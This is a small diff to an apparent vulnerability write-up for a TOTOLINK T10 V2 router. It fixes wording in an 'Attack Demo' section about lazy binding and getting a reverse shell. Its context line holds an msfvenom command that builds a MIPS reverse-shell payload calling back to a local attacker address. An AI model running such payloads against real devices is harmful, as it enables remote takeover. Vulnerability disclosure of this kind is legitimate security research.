@@ -70,8 +70,9 @@ sfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.55.2 LPORT=2333 -f py -o
 
 Attack Demo
 ========
-Because of Lazy binding mechanism，so we can send some short dirty data at first, the execute our exploit.<br>
-get the reverse shell
+Because of Lazy binding mechanism，so we can send some short dirty data at first, then execute our exploit.<br>
+
+Get the reverse shell!
 ![](https://github.com/Korey0sh1/IoT_vuln/blob/main/TOTOLINK/T10_V2/1.jpg)
 
 
